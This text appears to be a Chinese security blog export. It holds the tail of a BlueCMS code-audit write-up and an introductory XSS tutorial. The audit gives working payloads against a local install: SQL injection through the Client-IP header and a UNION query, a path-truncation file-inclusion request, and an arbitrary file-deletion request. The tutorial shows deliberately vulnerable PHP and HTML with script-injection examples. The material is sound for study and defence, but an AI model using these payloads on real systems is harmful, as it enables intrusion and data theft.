class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123; </span><br><span class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以使用<code>X-Forwarded-For</code>或者<code>CLIENT-IP</code>进行<code>SQL</code>注入</p>
<p><img src="/2020/08/04/bluecms/1596946094071.png" alt="1596946094071"><br>之后通过page_id访问在评论区可以看到结果</p>
<p><img src="/2020/08/04/bluecms/1596946112724.png" alt="1596946112724"></p>
<h3 id="comment-php"><a href="#comment-php" class="headerlink" title="comment.php"></a>comment.php</h3><p>在<strong>comment.php</strong>中也存在getip()，同样可以使用insert注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'send'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($id))</span><br><span class="line">	&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"></span><br><span class="line"> 	$user_id = $_SESSION[<span class="string">'user_id'</span>] ? $_SESSION[<span class="string">'user_id'</span>] : <span class="number">0</span>;</span><br><span class="line"> 	$mood = intval($_POST[<span class="string">'mood'</span>]);</span><br><span class="line"> 	$content = !<span class="keyword">empty</span>($_POST[<span class="string">'comment'</span>]) ? htmlspecialchars($_POST[<span class="string">'comment'</span>]) : <span class="string">''</span>;</span><br><span class="line"> 	$content = nl2br($content);</span><br><span class="line"> 	$type = intval($_POST[<span class="string">'type'</span>]);</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="keyword">empty</span>($content))</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		showmsg(<span class="string">'�������ݲ���Ϊ��'</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">if</span>($_CFG[<span class="string">'comment_is_check'</span>] == <span class="number">0</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		$is_check = <span class="number">1</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">else</span></span><br><span class="line"> 	&#123;</span><br><span class="line"> 		$is_check = <span class="number">0</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"></span><br><span class="line"> 	$sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'comment'</span>).<span class="string">" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> 			VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '"</span>.getip().<span class="string">"', '$is_check')"</span>;</span><br><span class="line"> 	$db-&gt;query($sql);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Client-IP: 1','1'),('','1','2','1','6',(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="string">'1'</span>,<span class="string">'1</span></span><br></pre></td></tr></table></figure>

<p>拼接后的sql语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">table</span>(<span class="string">'comment'</span>) (com_id, post_id, user_id, <span class="keyword">type</span>, mood, <span class="keyword">content</span>, pub_date, ip, is_check) <span class="keyword">VALUES</span> (<span class="string">''</span>, <span class="string">'$id'</span>, <span class="string">'$user_id'</span>, <span class="string">'$type'</span>, <span class="string">'$mood'</span>, <span class="string">'$content'</span>, <span class="string">'$timestamp'</span>, <span class="string">'1'</span>,<span class="string">'1'</span>),(<span class="string">''</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'1'</span>,<span class="string">'6'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'1'</span>,<span class="string">'1'</span>, <span class="string">'$is_check'</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/04/bluecms/1596961976816.png" alt="1596961976816"></p>
<p><img src="/2020/08/04/bluecms/1596962039284.png" alt="1596962039284"></p>
<h2 id="后台页面注入"><a href="#后台页面注入" class="headerlink" title="后台页面注入"></a>后台页面注入</h2><h3 id="admin-user-php"><a href="#admin-user-php" class="headerlink" title="/admin/user.php"></a><strong>/admin/user.php</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'edit'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">"select * from "</span>.table(<span class="string">'user'</span>).<span class="string">" where user_id = "</span>.$_GET[<span class="string">'user_id'</span>];</span><br><span class="line">	$user = $db-&gt;getone($sql);</span><br><span class="line">	$sexarr=<span class="keyword">array</span>(<span class="string">'0'</span>=&gt;<span class="string">'����'</span>,<span class="string">'1'</span>=&gt;<span class="string">'��'</span>,<span class="string">'2'</span>=&gt;<span class="string">'Ů'</span>);</span><br><span class="line">	template_assign(<span class="keyword">array</span>(<span class="string">'sexarr'</span>, <span class="string">'user'</span>, <span class="string">'act'</span>, <span class="string">'current_act'</span>), <span class="keyword">array</span>($sexarr, $user, $act, <span class="string">'�༭��Ա��Ϣ'</span>));</span><br><span class="line">	$smarty-&gt;display(<span class="string">'user_info.htm'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中user_id未做任何过滤，可直接进行注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">admin/user.php?act=edit&amp;user_id=<span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,user(),version(),<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/04/bluecms/1596962925022.png" alt="1596962925022"></p>
<h3 id="admin-attachment-php"><a href="#admin-attachment-php" class="headerlink" title="/admin/attachment.php"></a>/admin/attachment.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($_REQUEST[<span class="string">'act'</span>] == <span class="string">'del'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">"DELETE FROM "</span>.table(<span class="string">'attachment'</span>).<span class="string">" WHERE att_id = "</span>.$_GET[<span class="string">'att_id'</span>];</span><br><span class="line">	<span class="keyword">if</span>(!$db-&gt;query($sql))&#123;</span><br><span class="line">		showmsg(<span class="string">'ɾ���������Գ���'</span>, <span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	showmsg(<span class="string">'ɾ���������Գɹ�'</span>,<span class="string">'attachment.php'</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中att_id直接拼接在SQL语句后面，未做任何过滤，存在sql注入</p>
<h3 id="admin-nav-php"><a href="#admin-nav-php" class="headerlink" title="/admin/nav.php"></a><strong>/admin/nav.php</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act==<span class="string">'edit'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">"select * from "</span>.table(<span class="string">'navigate'</span>).<span class="string">" where navid = "</span>.$_GET[<span class="string">'navid'</span>];</span><br><span class="line">	$nav = $db-&gt;getone($sql);</span><br><span class="line">	$smarty-&gt;assign(<span class="string">'nav'</span>,$nav);</span><br><span class="line">	$smarty-&gt;assign(<span class="string">'act'</span>, $act	);</span><br><span class="line">	$smarty-&gt;display(<span class="string">'nav_info.htm'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接拼接，未做过滤，存在注入<br><img src="/2020/08/04/bluecms/1597044799009.png" alt="1597044799009"></p>
<p><strong>还有很多地方存在注入，原因大多是因为未过滤，利用方法都差不多</strong></p>
<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><p>反射型xss有很多，几乎存在SQL注入的地方就存在反射型xss，这里只简单写几个</p>
<h3 id="ad-js-php-1"><a href="#ad-js-php-1" class="headerlink" title="ad_js.php"></a>ad_js.php</h3><p>在<strong>ad_js.php</strong>文件中，其会将sql语句执行的结果进行输出，且无过滤，存在xss漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--\r\ndocument.write(\""</span>.$ad_content.<span class="string">"\");\r\n--&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/04/bluecms/1596787578492.png" alt="1596787578492"></p>
<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><h3 id="user-php-1"><a href="#user-php-1" class="headerlink" title="user.php"></a>user.php</h3><p>在用户界面可以看到用户名邮箱等信息被输出，查看这几个地方的过滤情况</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'do_reg'</span>)&#123;</span><br><span class="line">$user_name 		=	!<span class="keyword">empty</span>($_POST[<span class="string">'user_name'</span>]) ? trim($_POST[<span class="string">'user_name'</span>]) : <span class="string">''</span>;</span><br><span class="line">$pwd       		= 	!<span class="keyword">empty</span>($_POST[<span class="string">'pwd'</span>]) ? trim($_POST[<span class="string">'pwd'</span>]) : <span class="string">''</span>;</span><br><span class="line">$pwd1 	   		= 	!<span class="keyword">empty</span>($_POST[<span class="string">'pwd1'</span>]) ? trim($_POST[<span class="string">'pwd1'</span>]) : <span class="string">''</span>;</span><br><span class="line">$email     		= 	!<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>]) ? trim($_POST[<span class="string">'email'</span>]) : <span class="string">''</span>;</span><br><span class="line">$safecode  		= 	!<span class="keyword">empty</span>($_POST[<span class="string">'safecode'</span>]) ? trim($_POST[<span class="string">'safecode'</span>]) : <span class="string">''</span>;</span><br><span class="line">$from = !<span class="keyword">empty</span>($from) ? base64_decode($from) : <span class="string">'user.php'</span>;</span><br></pre></td></tr></table></figure>

<p>发现几个输入点都只进行了trim过滤，所以存在存储型xss<br>用户名处由于长度限制不好利用，所以从邮箱入手<br><img src="/2020/08/04/bluecms/1597046285550.png" alt="1597046285550"></p>
<p><img src="/2020/08/04/bluecms/1597046300094.png" alt="1597046300094"></p>
<h1 id="任意文件包含漏洞"><a href="#任意文件包含漏洞" class="headerlink" title="任意文件包含漏洞"></a>任意文件包含漏洞</h1><h3 id="user-php-2"><a href="#user-php-2" class="headerlink" title="user.php"></a><strong>user.php</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">'pay'</span>)&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'data/pay.cache.php'</span>;</span><br><span class="line">	$price = $_POST[<span class="string">'price'</span>];</span><br><span class="line">	$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">	$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'pay'</span>])) &#123;</span><br><span class="line">		showmsg(<span class="string">'�Բ�����û��ѡ��֧����ʽ'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'include/payment/'</span>.$_POST[<span class="string">'pay'</span>].<span class="string">"/index.php"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可直接使用../和…[……]…来截断进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">点号截断：</span><br><span class="line">    /boot.ini/………[…]…………</span><br><span class="line">    (php版本小于<span class="number">5.2</span><span class="number">.8</span>(?)可以成功，只适用windows，点号需要长于<span class="number">256</span>)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">http:<span class="comment">//127.0.0.1/bluecms/user.php?act=pay</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">pay=../../<span class="number">2.</span>php........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/04/bluecms/1596804493234.png" alt="1596804493234"></p>
<h1 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h1><h3 id="user-php-3"><a href="#user-php-3" class="headerlink" title="user.php"></a><strong>user.php</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(BLUE_ROOT.$_POST[<span class="string">'lit_pic'</span>])) &#123;</span><br><span class="line">	@unlink(BLUE_ROOT.$_POST[<span class="string">'lit_pic'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中lit_pic未做任何过滤，存在任意文件删除，还有一些其他参数如face_pic3也存在相同漏洞<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">    http:<span class="comment">//127.0.0.1/bluecms/user.php?act=do_info_edit</span></span><br><span class="line">POST</span><br><span class="line">    post_id=<span class="number">1</span>&amp;title=<span class="number">1</span>&amp;link_phone=<span class="number">123</span>&amp;link_man=<span class="number">1</span>&amp;lit_pic=<span class="number">2.</span>php</span><br></pre></td></tr></table></figure>

<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="user-php-4"><a href="#user-php-4" class="headerlink" title="user.php"></a>user.php</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'face_pic1'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($_POST[<span class="string">'face_pic1'</span>], <span class="string">'http://'</span>) != <span class="keyword">false</span> &amp;&amp; strpos($_POST[<span class="string">'face_pic1'</span>], <span class="string">'https://'</span>) != <span class="keyword">false</span>)&#123;</span><br><span class="line">       showmsg(<span class="string">'只支持本站相对路径地址'</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<p>这里有一处if判断，对于strpos函数应该使用===来判断 因为0和false弱类型相等 这里过滤有问题</p>
<p><img src="/2020/08/04/bluecms/1597049045059.png" alt="1597049045059"></p>
]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>初探XSS</title>
    <url>/2020/03/04/xss-summary/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从2019年十月份到现在，已经过去了近半年了，学到了很多安全方面的知识，但是一直感觉很浮躁，做的笔记也是零零散散，于是突发奇想想把自己所学的知识总结并联系在一起，整理一下自己的笔记以加深印象并且查漏补缺。纠结了很久，决定先从xss开始总结吧。—–2020.3.4<a id="more"></a></p>
<h1 id="xss简介"><a href="#xss简介" class="headerlink" title="xss简介"></a>xss简介</h1><h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross Site Scripting"></a>Cross Site Scripting</h2><p>​    &nbsp;&nbsp;&nbsp;&nbsp;跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会 被执行，从而达到恶意攻击用户的目的。<br>​    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以在代码审计中xss 漏洞关键就是寻找参数未过滤的输出函数。 </p>
<h2 id="xss能做什么"><a href="#xss能做什么" class="headerlink" title="xss能做什么:"></a>xss能做什么:</h2><p>​    盗取Cookie(用的最频繁的)<br>​    获取内网ip<br>​    获取浏览器保存的明文密码<br>​    截取网页屏幕<br>​    网页上的键盘记录</p>
<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="反射型XSS：-lt-非持久化-gt"><a href="#反射型XSS：-lt-非持久化-gt" class="headerlink" title="反射型XSS：&lt;非持久化 &gt;"></a>反射型XSS：&lt;非持久化 &gt;</h2><p>​     &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容 易出现在搜索页面。DOM型XSS由于危害较小，我们将其归为反射型XSS。</p>
<h2 id="存储型XSS：-lt-持久化-gt"><a href="#存储型XSS：-lt-持久化-gt" class="headerlink" title="存储型XSS：&lt;持久化&gt;"></a>存储型XSS：&lt;持久化&gt;</h2><p>​    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存 到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie(虽然 还有种DOM型XSS，但是也还是包括在存储型XSS内)。 </p>
<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>​    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DOM型xss是使用DOM动态访问更新文档的内容、结构样式。HTML标签都是节点，节点组成了节点树。通过HTML，DOM可以对树上的所有及节点进行修改。<br>​    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会处理xss代码，触发xss漏洞</p>
<h1 id="XSS简单理解"><a href="#XSS简单理解" class="headerlink" title="XSS简单理解"></a>XSS简单理解</h1><h2 id="初探XSS原理"><a href="#初探XSS原理" class="headerlink" title="初探XSS原理"></a>初探XSS原理</h2><h3 id="反射型XSS简单代码"><a href="#反射型XSS简单代码" class="headerlink" title="反射型XSS简单代码"></a>反射型XSS简单代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$age = $_GET[<span class="string">'age'</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;我的年龄是"</span>.$age.<span class="string">"&lt;h1&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/xss-summary/1.png" alt="img"><br>查看源代码：<br><img src="/2020/03/04/xss-summary/2.png" alt="img"><br>接下来我们对赋值的12尝试注入一个js语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/xss.php?age=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'xss!!'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/xss-summary/3.png" alt="img"><br>查看源代码<br><img src="/2020/03/04/xss-summary/4.png" alt="img"><br>可以看到成功注入了一个script代码并执行了alert输出提示内容</p>
<h3 id="存储性XSS简单代码"><a href="#存储性XSS简单代码" class="headerlink" title="存储性XSS简单代码"></a>存储性XSS简单代码</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">	请输入你要留言的内容：<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">"Mid"</span> <span class="attr">name</span>=<span class="string">"desc"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	请输入你的ID：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">onclick</span>=<span class="string">'loction="xss.php"'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'desc'</span>]))</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		$log=fopen(<span class="string">"store.txt"</span>,<span class="string">"a"</span>);</span></span><br><span class="line"><span class="php">		fwrite($log,$_POST[<span class="string">'user'</span>].<span class="string">"\r\n"</span>);</span></span><br><span class="line"><span class="php">		fwrite($log,$_POST[<span class="string">'desc'</span>].<span class="string">"\r\n"</span>);</span></span><br><span class="line"><span class="php">		fclose($log);</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>(file_exists(<span class="string">"store.txt"</span>)) &#123;</span></span><br><span class="line"><span class="php">		$read=fopen(<span class="string">"store.txt"</span>,<span class="string">'r'</span>);</span></span><br><span class="line"><span class="php">		<span class="keyword">while</span>(!feof($read)) &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">echo</span> fgets($read).<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		fclose($read);</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    <img src="/2020/03/04/xss-summary/5.png" alt="img"><br>​    存储型XSS的攻击流程： 打开web—-&gt;输入一个恶意代码—-&gt;恶意代码存放到数据库—-&gt;读取页面—-&gt;读取数据库—-&gt;返回web—-&gt;执行恶意代 码<br>​     这个页面的功能是使用POST提交数据，生成然后再读取文本模拟数据库，提交数据之后页面会将数据写入store.txt，再打 开页面时会读取store.txt中内容并输出在网页上，实现XSS Stored Attack.<br>正常执行：<br><img src="/2020/03/04/xss-summary/6.png" alt="img"><br>插入一个恶意的JavaScript代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/xss-summary/7.png" alt="img"><br>查看源代码<br><img src="/2020/03/04/xss-summary/8.png" alt="img"><br>发现我们输入的JavaScript语句被插入html中，并且被执行。当我们再次刷新页面的时候仍然会被执行。<br>因此总结可得：<br>     对程序的某个可控变量进行恶意JavaScript代码注入，若能被浏览器执行该程序即存在XSS漏洞 </p>
<h3 id="存储性XSS简单代码："><a href="#存储性XSS简单代码：" class="headerlink" title="存储性XSS简单代码："></a>存储性XSS简单代码：</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM-xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Please choose a language:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"XSS"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"default"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">					<span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">"default="</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">						<span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"default="</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">						<span class="built_in">document</span>.write(<span class="string">"&lt;option value='"</span> + lang + <span class="string">"'&gt;"</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">"&lt;/option&gt;"</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">						document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">''</span> <span class="attr">disabled</span>=<span class="string">'disabled'</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span></span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line"><span class="handlebars"><span class="xml">					document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'English'</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">					document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'French'</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">					document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'Spanish'</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">					document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'German'</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Select"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/xss-summary/9.png" alt="img"><br>经过测试发现，当我们修改?default后面的内容时，修改的内容会被插入到html中<br><img src="/2020/03/04/xss-summary/11.png" alt="img"><br><img src="/2020/03/04/xss-summary/10.png" alt="img"><br>于是我们便可以插入我们的恶意语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/xss.php?default=&lt;script&gt;alert(document.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/xss-summary/12.png" alt="img"></p>
<h2 id="XSS-Payload构造"><a href="#XSS-Payload构造" class="headerlink" title="XSS-Payload构造"></a>XSS-Payload构造</h2><h3 id="常用HTML标签"><a href="#常用HTML标签" class="headerlink" title="常用HTML标签"></a>常用HTML标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>    iframe元素会创建包含另外一个文档的内联框架</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>   <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>标签定义多行文本输入控件</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>    向网页中嵌入一张图片</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">   <span class="tag">&lt;<span class="name">script</span>&gt;</span>标签用于定义客户端脚本，比如JavaScript</span></span></span><br></pre></td></tr></table></figure>

<p> script元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件必须的type属性规定脚本的mime类型<br>JavaScript的常见应用是图像操作、表单验证以及动态内容更新</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>点击这里跳转<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

